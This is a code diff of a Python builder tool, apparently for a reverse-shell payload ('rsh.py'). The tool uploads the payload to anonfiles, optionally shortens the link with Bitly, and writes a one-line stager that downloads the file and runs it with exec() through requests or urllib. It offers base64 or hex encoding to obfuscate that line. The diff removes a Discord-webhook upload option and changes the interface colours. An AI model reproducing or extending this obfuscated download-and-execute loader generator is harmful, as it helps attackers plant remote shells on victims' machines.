@@ -11,7 +11,7 @@ for dir in ["tmp", "build"]: mkdir(dir) if not exists(dir) else None
 def sinput(string):
     return Write.Input(
         text=string,
-        color=Colors.red_to_purple, 
+        color=Colors.white_to_green, 
         interval=0.015,
         hide_cursor=False,
         input_color=Colors.dark_gray
@@ -37,7 +37,7 @@ def display_title():
 
     output = "\n\n"+"\n".join(["    "+title_lines[i]+spaces+pic_lines[i]+"    " for i in range(len(pic_lines))])+"\n\n\n\n"
 
-    return Colorate.Vertical(Colors.red_to_black, output, 2)
+    return Colorate.Vertical(Colors.green_to_white, output, 2)
 
 
 def check_token(token):
@@ -65,26 +65,19 @@ def build():
             'file': open('tmp/rsh.py', 'rb'),
         }
 
-        if service == "anonfiles":
-            resp = post('https://api.anonfiles.com/upload', files=files)
 
-            json = resp.json()
+        resp = post('https://api.anonfiles.com/upload', files=files)
 
-            anonfile_url = json["data"]["file"]["url"]["full"]
+        json = resp.json()
 
-            page = get(anonfile_url).text
+        anonfile_url = json["data"]["file"]["url"]["full"]
 
-            start = page.find("https://cdn-") + len("https://cdn-")
-            end = page.find("/rsh.py")
-            file_url = "https://cdn-"+page[start:end]+"/rsh.py"
+        page = get(anonfile_url).text
 
-        if service == "discord webhook":
+        start = page.find("https://cdn-") + len("https://cdn-")
+        end = page.find("/rsh.py")
+        file_url = "https://cdn-"+page[start:end]+"/rsh.py"
 
-            resp = post(webhook_url, files=files)
-
-            json = resp.json()
-
-            file_url = f"https://cdn.discordapp.com/attachments/{json['channel_id']}/{json['attachments'][0]['id']}/rsh.py"
 
         if is_shorted:
 
@@ -102,16 +95,20 @@ def build():
 
             file_url = resp.json().get("link")
 
+        if module == "requests":
+            content = f"exec(__import__('requests').get('{file_url}').text)"
+        
+        if module == "urllib":
+            content = f"exec(__import__('urllib.request').request.urlopen('{file_url}').read())"
 
-        content = f"exec(__import__('requests').get('{file_url}').text)"
+        if is_encoded:
+            if encoding == "base64":
+                encoded_output = b64encode(content.encode()).decode()
+                content = f"exec(__import__('base64').b64decode('{encoded_output}'))"
 
-        if encoding == "base64":
-            encoded_output = b64encode(content.encode()).decode()
-            content = f"exec(__import__('base64').b64decode('{encoded_output}'))"
-
-        if encoding == "hexadecimal":
-            encoded_output = "".join([hex(ord(character)).replace("0x","\\x") for character in content])
-            content = f"exec('{encoded_output}')"
+            if encoding == "hexadecimal":
+                encoded_output = "".join([hex(ord(character)).replace("0x","\\x") for character in content])
+                content = f"exec('{encoded_output}')"
 
     else:
         content = obfuscate(rsh)
@@ -142,19 +139,15 @@ def main():
 
     if is_hosted:
 
-        global service
-        service = choice_input("Which services do you want to use", ["Discord Webhook","Anonfiles"])
-
-        if service == "discord webhook":
-            global webhook_url
-            webhook_url = sinput("Discord Webhook URL > ")
-
         global is_shorted
         is_shorted = choice_input("Do you want to short you'r link with Bitly")
 
         if is_shorted:
             global bitly_key
             bitly_key = sinput("Enter you'r Bitly API key > ")
+
+        global module
+        module = choice_input("Which modules do you want to use", ["urllib", "requests"])
 
         global is_encoded
         is_encoded = choice_input("Do you want to encode your output")
@@ -169,4 +162,5 @@ def main():
 
 
 
-if __name__ == "__main__": main()
+if __name__ == "__main__":
+    main()
